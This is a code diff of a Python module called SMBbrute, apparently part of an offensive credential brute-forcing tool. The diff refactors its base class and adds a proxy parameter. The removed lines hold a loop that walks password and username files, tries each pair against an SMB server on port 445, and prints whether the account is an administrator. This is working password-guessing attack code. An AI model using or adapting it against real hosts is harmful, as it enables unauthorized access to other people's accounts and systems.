@@ -4,14 +4,14 @@
 import smb
 from smb.base import SharedDevice
 from smb.SMBConnection import SMBConnection
-from core.smbModule import smbModule
+from core.nonHTTPModule import nonHTTPModule
 import time
 
 
-class SMBbrute(smbModule):
+class SMBbrute(nonHTTPModule):
     def __init__(self, config, display, lock):
         super(SMBbrute, self).__init__(config, display, lock)
-        self.fingerprint="smb"
+        self.fingerprint="SMB"
         self.response=""
 
     def somethingCool(self, config, userID, password, server_name, conn, connection):
@@ -21,8 +21,7 @@ class SMBbrute(smbModule):
             except:
                 print "[-]        User is not an Administrator"
 
-    def connectTest(self, config, userID, password, server_name):
-        #print userID + " " + password + " " + server_name + " " + config["domain"]
+    def connectTest(self, config, userID, password, server_name, proxy):
         conn = SMBConnection(userID, password, 'pycon', server_name, use_ntlm_v2=True, domain=config["domain"], sign_options=SMBConnection.SIGN_WHEN_SUPPORTED, is_direct_tcp=True)
         connection = conn.connect(server_name, 445)
         if connection:
@@ -30,35 +29,3 @@ class SMBbrute(smbModule):
             self.somethingCool(config, userID, password, server_name, conn, connection)
         else:
             print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
-
-    def payload(self, config):
-        server_name = str(config["HOST"]).strip('smb://')
-        if config["PASS_FILE"]:
-            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
-            for pass_line in pass_lines:
-                if config["UserFile"]:
-                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                    for line in lines:
-                        config["USERNAME"] = line.strip('\n')
-                        config["PASSWORD"] = pass_line.strip('\n')
-                        userID = config["USERNAME"]
-                        password = config["PASSWORD"]
-                        self.connectTest(config, userID, password, server_name)
-                    time.sleep(config["timeout"])
-                else:
-                    config["PASSWORD"] = pass_line.strip('\n')
-                    userID = config["USERNAME"]
-                    password = config["PASSWORD"]
-                    self.connectTest(config, userID, password, server_name)
-                    time.sleep(config["timeout"])
-        elif config["UserFile"]:
-            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-            for line in lines:
-                config["USERNAME"] = line.strip('\n')
-                userID = config["USERNAME"]
-                password = config["PASSWORD"]
-                self.connectTest(config, userID, password, server_name)
-        else:
-            userID = config["USERNAME"]
-            password = config["PASSWORD"]
-            self.connectTest(config, userID, password, server_name)
